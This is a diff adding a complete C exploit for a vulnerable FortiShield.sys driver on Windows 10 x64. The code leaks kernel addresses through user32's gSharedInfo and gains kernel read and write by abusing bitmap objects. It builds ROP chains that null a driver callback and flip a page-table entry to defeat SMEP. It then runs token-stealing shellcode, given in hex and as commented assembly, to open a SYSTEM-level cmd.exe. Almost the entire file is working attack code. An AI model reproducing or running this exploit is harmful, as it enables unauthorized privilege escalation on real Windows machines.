@@ -1,0 +1,564 @@
+/*
+Check these out: 
+- https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
+- https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/
+Tested on: 
+- Windows 10 Pro x64 (Post-Anniversary)
+- ntoskrnl.exe: 10.0.14393.953
+- FortiShield.sys: 5.2.3.633
+Thanks to master @ryujin and @ronin for helping out. And thanks to Morten (@Blomster81) for the MiGetPteAddress :D 
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+#include <Psapi.h>
+
+#pragma comment (lib,"psapi")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "User32.lib")
+
+#define object_number 0x02
+#define accel_array_size 0x2b6
+#define STATUS_SUCCESS 0x00000000
+
+typedef void** PPVOID;
+
+typedef struct _tagSERVERINFO {
+	UINT64 pad;
+	UINT64 cbHandleEntries;
+} SERVERINFO, *PSERVERINFO;
+
+typedef struct _HANDLEENTRY {
+	PVOID pHeader;	// Pointer to the Object
+	PVOID pOwner;	// PTI or PPI
+	UCHAR bType;	// Object handle type
+	UCHAR bFlags;	// Flags
+	USHORT wUniq;	// Access count
+} HANDLEENTRY, *PHANDLEENTRY;
+
+typedef struct _SHAREDINFO {
+	PSERVERINFO psi;
+	PHANDLEENTRY aheList;
+} SHAREDINFO, *PSHAREDINFO;
+
+ULONGLONG get_pxe_address_64(ULONGLONG address, ULONGLONG pte_start) {
+	ULONGLONG result = address >> 9;
+	result = result | pte_start;
+	result = result & (pte_start + 0x0000007ffffffff8);
+	return result;
+}
+
+HMODULE ntdll;
+HMODULE user32dll;
+
+struct bitmap_structure {
+	HBITMAP manager_bitmap;
+	HBITMAP worker_bitmap;
+};
+
+struct bitmap_structure create_bitmaps(HACCEL hAccel[object_number]) {
+	struct bitmap_structure bitmaps;
+	char *manager_bitmap_memory;
+	char *worker_bitmap_memory;
+	HBITMAP manager_bitmap;
+	HBITMAP worker_bitmap;
+	int nWidth = 0x703;
+	int nHeight = 2;
+	unsigned int cPlanes = 1;
+	unsigned int cBitsPerPel = 8;
+	const void *manager_lpvBits;
+	const void *worker_lpvBits;
+
+	manager_bitmap_memory = malloc(nWidth * nHeight);
+	memset(manager_bitmap_memory, 0x00, sizeof(manager_bitmap_memory));
+	manager_lpvBits = manager_bitmap_memory;
+
+	worker_bitmap_memory = malloc(nWidth * nHeight);
+	memset(worker_bitmap_memory, 0x00, sizeof(worker_bitmap_memory));
+	worker_lpvBits = worker_bitmap_memory;
+
+	BOOL destroy_table;
+	destroy_table = DestroyAcceleratorTable(hAccel[0]);
+	if (destroy_table == 0) {
+		printf("[!] Failed to delete accelerator table[0]: %d\n", GetLastError());
+		exit(1);
+	}
+
+	manager_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, manager_lpvBits);
+	if (manager_bitmap == NULL) {
+		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
+		exit(1);
+	}
+	printf("[+] Manager BitMap HANDLE: %I64x\n", (ULONGLONG)manager_bitmap);
+
+	destroy_table = DestroyAcceleratorTable(hAccel[1]);
+	if (destroy_table == 0) {
+		printf("[!] Failed to delete accelerator table[1]: %d\n", GetLastError());
+		exit(1);
+	}
+	worker_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, worker_lpvBits);
+	if (worker_bitmap == NULL) {
+		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
+		exit(1);
+	}
+	printf("[+] Worker BitMap HANDLE: %I64x\n", (ULONGLONG)worker_bitmap);
+
+	bitmaps.manager_bitmap = manager_bitmap;
+	bitmaps.worker_bitmap = worker_bitmap;
+	return bitmaps;
+}
+
+PHANDLEENTRY leak_table_kernel_address(HMODULE user32dll, HACCEL hAccel[object_number], PHANDLEENTRY handle_entry[object_number]) {
+	int i;
+	PSHAREDINFO gSharedInfo;
+	ULONGLONG aheList;
+	DWORD handle_entry_size = 0x18;
+
+	gSharedInfo = (PSHAREDINFO)GetProcAddress(user32dll, (LPCSTR)"gSharedInfo");
+	if (gSharedInfo == NULL) {
+		printf("[!] Error while retrieving gSharedInfo: %d.\n", GetLastError());
+		return NULL;
+	}
+	aheList = (ULONGLONG)gSharedInfo->aheList;
+	printf("[+] USER32!gSharedInfo located at: %I64x\n", (ULONGLONG)gSharedInfo);
+	printf("[+] USER32!gSharedInfo->aheList located at: %I64x\n", (ULONGLONG)aheList);
+	for (i = 0; i < object_number; i++) {
+		handle_entry[i] = (PHANDLEENTRY)(aheList + ((ULONGLONG)hAccel[i] & 0xffff) * handle_entry_size);
+	}
+	return *handle_entry;
+}
+
+ULONGLONG write_bitmap(HBITMAP bitmap_handle, ULONGLONG to_write) {
+	ULONGLONG write_operation;
+	write_operation = SetBitmapBits(bitmap_handle, sizeof(ULONGLONG), &to_write);
+	if (write_operation == 0) {
+		printf("[!] Failed to write bits to bitmap: %d\n", GetLastError());
+		exit(1);
+	}
+	return 0;
+}
+
+ULONGLONG read_bitmap(HBITMAP bitmap_handle) {
+	ULONGLONG read_operation;
+	ULONGLONG to_read;
+	read_operation = GetBitmapBits(bitmap_handle, sizeof(ULONGLONG), &to_read);
+	if (read_operation == 0) {
+		printf("[!] Failed to write bits to bitmap: %d\n", GetLastError());
+		exit(1);
+	}
+	return to_read;
+}
+
+HACCEL create_accelerator_table(HACCEL hAccel[object_number], int table_number) {
+	int i;
+	table_number = object_number;
+	ACCEL accel_array[accel_array_size];
+	LPACCEL lpAccel = accel_array;
+
+	printf("[+] Creating %d Accelerator Tables\n", table_number);
+	for (i = 0; i < table_number; i++) {
+		hAccel[i] = CreateAcceleratorTableA(lpAccel, accel_array_size);
+		if (hAccel[i] == NULL) {
+			printf("[!] Error while creating the accelerator table: %d.\n", GetLastError());
+			exit(1);
+		}
+	}
+	return *hAccel;
+}
+
+LPVOID allocate_rop_chain(LPVOID kernel_base, ULONGLONG fortishield_callback, ULONGLONG fortishield_restore, ULONGLONG manager_pvScan_offset, ULONGLONG worker_pvScan_offset) {
+	HANDLE pid;
+	pid = GetCurrentProcess();
+	ULONGLONG rop_chain_address = 0x000000008aff07da;
+	LPVOID allocate_rop_chain;
+	allocate_rop_chain = VirtualAlloc((LPVOID*)rop_chain_address, 0x12000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (allocate_rop_chain == NULL) {
+		printf("[!] Error while allocating rop_chain: %d\n", GetLastError());
+		exit(1);
+	}
+
+	/* <Null callback> */
+	ULONGLONG rop_01 = (ULONGLONG)kernel_base + 0x14adaf;	// pop rax; pop rcx; ret
+	ULONGLONG rop_02 = fortishield_callback;
+	ULONGLONG rop_03 = 0x0000000000000000;					// NULL the callback
+	ULONGLONG rop_04 = (ULONGLONG)kernel_base + 0xb7621;	// mov qword ptr [rax], rcx ; ret 
+	/* </Null callback> */
+
+	/* <Overwrite pvScan0> */
+	ULONGLONG rop_05 = (ULONGLONG)kernel_base + 0x14adaf;	// pop rax; pop rcx; ret
+	ULONGLONG rop_06 = (ULONGLONG)manager_pvScan_offset;	// Manager BitMap pvScan0 offset
+	ULONGLONG rop_07 = (ULONGLONG)worker_pvScan_offset;		// Worker BitMap pvScan0 offset
+	ULONGLONG rop_08 = (ULONGLONG)kernel_base + 0xb7621;	// mov qword ptr [rax], rcx ; ret 
+	/* </Overwrite pvScan0> */
+
+	/* <Prepare RBX (to write the orignial stack pointer to> */
+	ULONGLONG rop_09 = (ULONGLONG)kernel_base + 0x62c0c3;	// pop rbx ; ret
+	ULONGLONG rop_10 = 0x000000008b0000e0;
+	/* </Prepare RBX (to write the orignial stack pointer to> */
+
+	/* <Get RSI value (points to the original stack) into RAX> */
+	ULONGLONG rop_11 = (ULONGLONG)kernel_base + 0x6292eb;	// pop rax ; ret
+	ULONGLONG rop_12 = (ULONGLONG)kernel_base + 0x556dc9;	// mov rax, rcx ; add rsp, 0x28 ; ret
+	ULONGLONG rop_13 = (ULONGLONG)kernel_base + 0x4115ca;	// mov rcx, rsi ; call rax
+	ULONGLONG rop_14 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_15 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_16 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_17 = 0x4141414141414141;					// JUNK
+	/* </Get RSI value (points to the original stack) into RAX> */
+
+	/* <Adjust RAX to point to the return address pushed by the call> */
+	ULONGLONG rop_18 = (ULONGLONG)kernel_base + 0x61260f;	// pop rcx ; ret
+	ULONGLONG rop_19 = 0x0000000000000028;					// Get the return address
+	ULONGLONG rop_20 = (ULONGLONG)kernel_base + 0xd8c12;	// sub rax, rcx ; ret
+	/* </Adjust RAX to point to the return address pushed by the call> */
+
+	/* <Overwrite the return from the call with fortishield_restore> */
+	ULONGLONG rop_21 = (ULONGLONG)kernel_base + 0x61260f;	// pop rcx ; ret
+	ULONGLONG rop_22 = fortishield_restore;
+	ULONGLONG rop_23 = (ULONGLONG)kernel_base + 0xb7621;	// mov qword ptr [rax], rcx ; ret
+	/* </Overwrite the return from the call with fortishield_restore> */
+
+	/* <Write the original stack pointer on our usermode_stack> */
+	ULONGLONG rop_24 = (ULONGLONG)kernel_base + 0x4cde3e;	// mov qword ptr [rbx + 0x10], rax ; add rsp, 0x20 ; pop rbx ; ret
+	ULONGLONG rop_25 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_26 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_27 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_28 = 0x4141414141414141;					// JUNK
+	ULONGLONG rop_29 = 0x0000000000000000;					// Value to be POP'ed in RBX, needs to be 0x00 at the end for restore
+	/* </Write the original stack pointer on our usermode_stack> */
+
+	/* <Restore stack pointer> */
+	ULONGLONG rop_30 = (ULONGLONG)kernel_base + 0x62b91b;	// pop rsp ; ret
+	/* </Restore stack pointer> */
+
+	char *rop_chain;
+	DWORD rop_chain_size = 0x12000;
+	rop_chain = (char *)malloc(rop_chain_size);
+	memset(rop_chain, 0x41, rop_chain_size);
+	memcpy(rop_chain + 0xf826, &rop_01, 0x08);
+	memcpy(rop_chain + 0xf82e, &rop_02, 0x08);
+	memcpy(rop_chain + 0xf836, &rop_03, 0x08);
+	memcpy(rop_chain + 0xf83e, &rop_04, 0x08);
+	memcpy(rop_chain + 0xf846, &rop_05, 0x08);
+	memcpy(rop_chain + 0xf84e, &rop_06, 0x08);
+	memcpy(rop_chain + 0xf856, &rop_07, 0x08);
+	memcpy(rop_chain + 0xf85e, &rop_08, 0x08);
+	memcpy(rop_chain + 0xf866, &rop_09, 0x08);
+	memcpy(rop_chain + 0xf86e, &rop_10, 0x08);
+	memcpy(rop_chain + 0xf876, &rop_11, 0x08);
+	memcpy(rop_chain + 0xf87e, &rop_12, 0x08);
+	memcpy(rop_chain + 0xf886, &rop_13, 0x08);
+	memcpy(rop_chain + 0xf88e, &rop_14, 0x08);
+	memcpy(rop_chain + 0xf896, &rop_15, 0x08);
+	memcpy(rop_chain + 0xf89e, &rop_16, 0x08);
+	memcpy(rop_chain + 0xf8a6, &rop_17, 0x08);
+	memcpy(rop_chain + 0xf8ae, &rop_18, 0x08);
+	memcpy(rop_chain + 0xf8b6, &rop_19, 0x08);
+	memcpy(rop_chain + 0xf8be, &rop_20, 0x08);
+	memcpy(rop_chain + 0xf8c6, &rop_21, 0x08);
+	memcpy(rop_chain + 0xf8ce, &rop_22, 0x08);
+	memcpy(rop_chain + 0xf8d6, &rop_23, 0x08);
+	memcpy(rop_chain + 0xf8de, &rop_24, 0x08);
+	memcpy(rop_chain + 0xf8e6, &rop_25, 0x08);
+	memcpy(rop_chain + 0xf8ee, &rop_26, 0x08);
+	memcpy(rop_chain + 0xf8f6, &rop_27, 0x08);
+	memcpy(rop_chain + 0xf8fe, &rop_28, 0x08);
+	memcpy(rop_chain + 0xf906, &rop_29, 0x08);
+	memcpy(rop_chain + 0xf90e, &rop_30, 0x08);
+
+	BOOL WPMresult;
+	SIZE_T written;
+	WPMresult = WriteProcessMemory(pid, (LPVOID)rop_chain_address, rop_chain, rop_chain_size, &written);
+	if (WPMresult == 0)
+	{
+		printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
+		exit(1);
+	}
+	printf("[+] Memory allocated at: %p\n", allocate_rop_chain);
+	return allocate_rop_chain;
+}
+
+LPVOID allocate_shellcode(LPVOID kernel_base, ULONGLONG fortishield_callback, ULONGLONG fortishield_restore, ULONGLONG pte_result) {
+	HANDLE pid;
+	pid = GetCurrentProcess();
+	ULONGLONG shellcode_address = 0x000000008aff07da;
+	LPVOID allocate_shellcode;
+	allocate_shellcode = VirtualAlloc((LPVOID*)shellcode_address, 0x12000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (allocate_shellcode == NULL) {
+		printf("[!] Error while allocating rop_chain: %d\n", GetLastError());
+		exit(1);
+	}
+
+	/* <Overwrite PTE> */
+	ULONGLONG rop_01 = (ULONGLONG)kernel_base + 0x14adaf;	// pop rax; pop rcx; ret
+	ULONGLONG rop_02 = (ULONGLONG)pte_result;				// PTE address
+	ULONGLONG rop_03 = 0x0000000000000063;					// DIRTY + ACCESSED + R/W + PRESENT
+	ULONGLONG rop_04 = (ULONGLONG)kernel_base + 0x130779;	// mov byte ptr [rax], cl ; mov rbx, qword ptr [rsp + 8] ; ret
+	ULONGLONG rop_05 = (ULONGLONG)kernel_base + 0xc459c;	// wbinvd ; ret
+	ULONGLONG rop_06 = 0x000000008b00081a;					// shellcode
+	ULONGLONG rop_07 = fortishield_callback;
+	ULONGLONG rop_08 = fortishield_restore;
+	/* </Overwrite PTE> */
+
+	/*
+	;kd> dt -r1 nt!_TEB
+	;   +0x110 SystemReserved1  : [54] Ptr64 Void
+	;??????+0x078 KTHREAD (not documented, can't get it from WinDBG directly)
+	kd> u nt!PsGetCurrentProcess
+	nt!PsGetCurrentProcess:
+	mov rax,qword ptr gs:[188h]
+	mov rax,qword ptr [rax+0B8h]
+
+	- Token stealing rop_chain & restore:
+
+	start:
+	mov rdx, [gs:0x188]
+	mov r8, [rdx+0x0b8]
+	mov r9, [r8+0x2f0]
+	mov rcx, [r9]
+	find_system_proc:
+	mov rdx, [rcx-0x8]
+	cmp rdx, 4
+	jz found_it
+	mov rcx, [rcx]
+	cmp rcx, r9
+	jnz find_system_proc
+	found_it:
+	mov rax, [rcx+0x68]
+	and al, 0x0f0
+	mov [r8+0x358], rax
+	restore:
+	mov rbp, qword ptr [rsp+0x80]
+	xor rbx, rbx
+	mov [rbp], rbx
+	mov rbp, qword ptr [rsp+0x88]
+	mov rax, rsi
+	mov rsp, rax
+	sub rsp, 0x20
+	jmp rbp
+	*/
+
+	char token_steal[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8"
+		"\x00\x00\x00\x4D\x8B\x88\xF0\x02\x00\x00\x49\x8B\x09"
+		"\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09"
+		"\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x68\x24\xF0\x49\x89"
+		"\x80\x58\x03\x00\x00\x48\x8B\xAC\x24\x80\x00\x00\x00"
+		"\x48\x31\xDB\x48\x89\x5D\x00\x48\x8B\xAC\x24\x88\x00"
+		"\x00\x00\x48\x89\xF0\x48\x89\xC4\x48\x83\xEC\x20\xFF\xE5";
+
+	char *shellcode;
+	DWORD shellcode_size = 0x12000;
+	shellcode = (char *)malloc(shellcode_size);
+	memset(shellcode, 0x41, shellcode_size);
+	memcpy(shellcode + 0xf826, &rop_01, 0x08);
+	memcpy(shellcode + 0xf82e, &rop_02, 0x08);
+	memcpy(shellcode + 0xf836, &rop_03, 0x08);
+	memcpy(shellcode + 0xf83e, &rop_04, 0x08);
+	memcpy(shellcode + 0xf846, &rop_05, 0x08);
+	memcpy(shellcode + 0xf84e, &rop_06, 0x08);
+	memcpy(shellcode + 0xf8d6, &rop_07, 0x08);
+	memcpy(shellcode + 0xf8de, &rop_08, 0x08);
+	memcpy(shellcode + 0x10040, token_steal, sizeof(token_steal));
+
+	BOOL WPMresult;
+	SIZE_T written;
+	WPMresult = WriteProcessMemory(pid, (LPVOID)shellcode_address, shellcode, shellcode_size, &written);
+	if (WPMresult == 0)
+	{
+		printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
+		exit(1);
+	}
+	printf("[+] Memory allocated at: %p\n", allocate_shellcode);
+	return allocate_shellcode;
+}
+
+LPVOID GetBaseAddr(char *drvname) {
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+	int nDrivers, i = 0;
+
+	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
+		char szDrivers[1024];
+		nDrivers = cbNeeded / sizeof(drivers[0]);
+		for (i = 0; i < nDrivers; i++) {
+			if (GetDeviceDriverBaseName(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
+				//printf("%s (%p)\n", szDrivers, drivers[i]);
+				if (strcmp(szDrivers, drvname) == 0) {
+					//printf("%s (%p)\n", szDrivers, drivers[i]);
+					return drivers[i];
+				}
+			}
+		}
+	}
+	return 0;
+}
+
+DWORD trigger_callback() {
+
+	/* This file needs to be on the local HDD to work. */
+	printf("[+] Creating dummy file\n");
+	system("echo test > test.txt");
+
+	printf("[+] Calling MoveFileEx()\n");
+	BOOL MFEresult;
+	MFEresult = MoveFileEx((LPCSTR)"test.txt", (LPCSTR)"test2.txt", MOVEFILE_REPLACE_EXISTING);
+	if (MFEresult == 0)
+	{
+		printf("[!] Error while calling MoveFileEx(): %d\n", GetLastError());
+		return 1;
+	}
+	return 0;
+}
+
+int main() {
+	ntdll = LoadLibrary((LPCSTR)"ntdll");
+	if (ntdll == NULL) {
+		printf("[!] Error while loading ntdll: %d\n", GetLastError());
+		return 1;
+	}
+
+	user32dll = LoadLibrary((LPCSTR)"user32");
+	if (user32dll == NULL) {
+		printf("[!] Error while loading user32: %d.\n", GetLastError());
+		return 1;
+	}
+
+	HACCEL hAccel[object_number];
+	create_accelerator_table(hAccel, object_number);
+
+	PHANDLEENTRY handle_entry[object_number];
+	leak_table_kernel_address(user32dll, hAccel, handle_entry);
+
+	printf(
+		"[+] Accelerator Table[0] HANDLE: %I64x\n"
+		"[+] Accelerator Table[0] HANDLE: %I64x\n"
+		"[+] Accelerator Table[0] kernel address: %I64x\n"
+		"[+] Accelerator Table[0] kernel address: %I64x\n",
+		(ULONGLONG)hAccel[0],
+		(ULONGLONG)hAccel[1],
+		(ULONGLONG)handle_entry[0]->pHeader,
+		(ULONGLONG)handle_entry[1]->pHeader
+	);
+
+	ULONGLONG manager_pvScan_offset;
+	ULONGLONG worker_pvScan_offset;
+	manager_pvScan_offset = (ULONGLONG)handle_entry[0]->pHeader + 0x18 + 0x38;
+	worker_pvScan_offset = (ULONGLONG)handle_entry[1]->pHeader + 0x18 + 0x38;
+
+	printf("[+] Replacing Accelerator Tables with BitMap objects\n");
+	struct bitmap_structure bitmaps;
+	bitmaps = create_bitmaps(hAccel);
+
+	printf("[+] Manager BitMap pvScan0 offset: %I64x\n", (ULONGLONG)manager_pvScan_offset);
+	printf("[+] Worker BitMap pvScan0 offset: %I64x\n", (ULONGLONG)worker_pvScan_offset);
+
+	HANDLE forti;
+	forti = CreateFile((LPCSTR)"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (forti == INVALID_HANDLE_VALUE) {
+		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
+		return 1;
+	}
+
+	LPVOID kernel_base = GetBaseAddr("ntoskrnl.exe");
+	LPVOID fortishield_base = GetBaseAddr("FortiShield.sys");
+	ULONGLONG kernel_pivot = (ULONGLONG)kernel_base + 0x4efae5;
+	ULONGLONG fortishield_callback = (ULONGLONG)fortishield_base + 0xd150;
+	ULONGLONG fortishield_restore = (ULONGLONG)fortishield_base + 0x2f73;
+	printf("[+] Kernel found at: %llx\n", (ULONGLONG)kernel_base);
+	printf("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)fortishield_base);
+
+	DWORD IoControlCode = 0x220028;
+	ULONGLONG InputBuffer = kernel_pivot;
+	DWORD InputBufferLength = 0x8;
+	ULONGLONG OutputBuffer = 0x0;
+	DWORD OutputBufferLength = 0x0;
+	DWORD lpBytesReturned;
+
+	LPVOID rop_chain_allocation;
+	rop_chain_allocation = allocate_rop_chain(kernel_base, fortishield_callback, fortishield_restore, manager_pvScan_offset, worker_pvScan_offset);
+
+	HANDLE hThread;
+	LPDWORD hThread_id = 0;
+	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
+	if (hThread == NULL)
+	{
+		printf("[!] Error while calling CreateThread: %d\n", GetLastError());
+		return 1;
+	}
+
+	BOOL hThread_priority;
+	hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
+	if (hThread_priority == 0)
+	{
+		printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
+		return 1;
+	}
+
+	
+	printf("[+] Press ENTER to trigger the vulnerability.\n");
+	getchar();
+	
+
+	BOOL triggerIOCTL;
+	ResumeThread(hThread);
+	triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+
+	/* <Reading the PTE base virtual address from nt!MiGetPteAddress + 0x13> */
+	ULONGLONG manager_write_pte_offset = (ULONGLONG)kernel_base + 0x47314 + 0x13;
+
+	printf("[+] Writing nt!MiGetPteAddress + 0x13 to Worker pvScan0.\n");
+	getchar();
+	write_bitmap(bitmaps.manager_bitmap, manager_write_pte_offset);
+
+	printf("[+] Reading from Worker pvScan0.\n");
+	getchar();
+	ULONGLONG pte_start = read_bitmap(bitmaps.worker_bitmap);
+	printf("[+] PTE virtual base address: %I64x\n", pte_start);
+
+	ULONGLONG pte_result;
+	ULONGLONG pte_value = 0x8b000000;
+	pte_result = get_pxe_address_64(pte_value, pte_start);
+	printf("[+] PTE virtual address for 0x8b000000: %I64x\n", pte_result);
+	/* </Reading the PTE base virtual address from nt!MiGetPteAddress + 0x13> */
+
+	BOOL VFresult;
+	VFresult = VirtualFree(rop_chain_allocation, 0x0, MEM_RELEASE);
+	if (VFresult == 0)
+	{
+		printf("[!] Error while calling VirtualFree: %d\n", GetLastError());
+		return 1;
+	}
+
+	LPVOID shellcode_allocation;
+	shellcode_allocation = allocate_shellcode(kernel_base, fortishield_callback, fortishield_restore, pte_result);
+
+	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
+	if (hThread == NULL)
+	{
+		printf("[!] Error while calling CreateThread: %d\n", GetLastError());
+		return 1;
+	}
+
+	hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
+	if (hThread_priority == 0)
+	{
+		printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
+		return 1;
+	}
+
+	printf("[+] Press ENTER to trigger the vulnerability again.\n");
+	getchar();
+
+	ResumeThread(hThread);
+	triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+	
+	printf("\n");
+	system("start cmd.exe");
+	DeleteObject(bitmaps.manager_bitmap);
+	DeleteObject(bitmaps.worker_bitmap);
+
+	return 0;
+}
